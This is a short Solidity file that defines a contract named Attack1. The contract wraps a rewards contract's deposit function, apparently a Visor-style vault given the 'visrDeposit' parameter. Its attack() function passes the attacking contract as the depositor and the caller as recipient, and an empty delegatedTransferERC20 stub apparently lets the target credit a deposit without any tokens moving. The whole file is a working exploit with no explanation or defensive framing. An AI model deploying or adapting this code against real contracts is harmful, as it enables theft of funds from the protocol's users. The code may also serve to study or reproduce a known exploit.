pragma solidity 0.7.6;
import "./Ownable.sol";

interface IRewards {
    function deposit(
        uint256 visrDeposit,
        address payable from,
        address to
    ) external;
}

contract Attack1 is Ownable {
    IRewards public iRewards;

    constructor(address _iRewards) public {
        iRewards = IRewards(_iRewards);
    }

    function delegatedTransferERC20(
        address token,
        address to,
        uint256 amount
    ) public {}

    function attack(uint256 amount) public {
        iRewards.deposit(amount, payable(address(this)), _msgSender());
    }
}
